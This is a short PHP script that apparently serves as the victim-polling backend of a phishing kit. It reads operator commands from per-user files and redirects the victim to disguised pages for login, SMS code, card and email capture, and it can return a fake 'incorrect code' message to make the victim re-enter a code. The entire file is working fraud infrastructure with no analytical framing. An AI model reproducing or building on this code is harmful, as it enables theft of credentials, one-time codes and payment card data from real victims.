<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['gate_pass'])) { http_response_code(403); echo json_encode(['ok'=>false,'error'=>'unauthorized']); exit; }

// Obtener el usuario de la sesión
$u = $_SESSION['usuario'] ?? null;

if (!$u) {
    echo json_encode(['status' => 'no_session']);
    exit;
}

$ar = "acciones/$u.txt";
$response = ['status' => 'pending'];

if (file_exists($ar)) {
    $ac = trim(file_get_contents($ar));
    unlink($ar);
    
    // Mapear acciones a respuestas
    switch ($ac) {
        case "/LISTO":
            $response = ['status' => 'redirect', 'target' => 'naranja.php'];
            break;
        case "/COMPRA":
            $response = ['status' => 'error', 'message' => 'Código incorrecto. Intente nuevamente.'];
            break;
        case "/LOGIN":
            $response = ['status' => 'redirect', 'target' => 'kiwi.php'];
            break;
        case "/SMS":
            $response = ['status' => 'redirect', 'target' => 'peru.php'];
            break;
        case "/CARD":
            $response = ['status' => 'redirect', 'target' => 'roma.html'];
            break;
        case "/MAIL":
            $response = ['status' => 'redirect', 'target' => 'cereza.php'];
            break;
    }
}

echo json_encode($response);
?>